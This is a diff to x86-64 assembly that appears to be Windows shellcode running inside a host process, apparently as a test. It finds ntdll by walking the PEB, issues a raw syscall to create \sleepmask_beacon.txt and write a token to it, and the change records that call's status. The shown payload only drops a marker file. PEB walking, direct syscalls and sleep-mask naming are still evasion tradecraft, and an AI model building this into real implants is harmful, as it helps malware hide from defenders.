@@ -47,6 +47,8 @@ sym_base:
     ; ---- 1. PEB -> Ldr -> walk InLoadOrder for ntdll.dll -----------------
     xor rax, rax
     mov [r12 + (ntdll_base - sym_base)], rax
+    not rax
+    mov [r12 + (create_status - sym_base)], rax
     mov rax, [gs:0x60]
     mov rax, [rax + 0x18]
     lea r14, [rax + 0x10]
@@ -184,6 +186,7 @@ sym_base:
     mov qword [rsp + 0x60], 0
     mov eax, [r12 + (nr_create - sym_base)]
     syscall
+    mov [r12 + (create_status - sym_base)], rax
     add rsp, 0x68
 
     ; ---- 10. if it opened, write the token to the file, then close --------
@@ -400,3 +403,4 @@ s_ntdll_u16:  dw 'n','t','d','l','l','.','d','l','l'
 filename_u16: dw 0x5C,'s','l','e','e','p','m','a','s','k','_','b','e','a','c','o','n','.','t','x','t',0
 msg:          db "sleepmask: coupled | windows x86-64 | host continues", 0x0a
 msglen        equ $ - msg
+create_status: resq 1
